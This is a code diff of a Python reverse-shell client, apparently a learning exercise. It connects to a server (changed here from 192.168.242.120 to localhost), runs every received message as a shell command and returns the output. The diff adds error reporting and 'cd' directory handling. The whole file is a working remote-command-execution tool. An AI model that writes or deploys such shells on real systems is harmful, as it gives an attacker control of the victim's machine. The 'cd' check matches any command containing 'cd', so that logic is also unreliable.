@@ -1,11 +1,27 @@
 import socket
 import subprocess
+import os
 
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-client_socket.connect(("192.168.242.120", 12345))
+client_socket.connect(("localhost", 12345))
+
+def chech_string(recv):
+    return "cd" in recv
+
 while True:
     message = (client_socket.recv(1024).decode("utf-8"))
-    result = subprocess.run(message, shell=True, capture_output=True, text=True)
-    client_socket.sendall(result.stdout.encode("utf-8"))
+    resp = chech_string(message)
+    if not resp:
+        result = subprocess.run(message, shell=True, capture_output=True, text=True)
+        out = result.stdout
+        err = result.stderr
+        if not err:
+            client_socket.sendall(out.encode("utf-8"))
+        else:
+            client_socket.sendall(err.encode("utf-8"))
+    else:
+        command = message.removeprefix("cd").strip()
+        os.chdir(command)
+        client_socket.sendall(os.getcwd().encode("utf-8"))
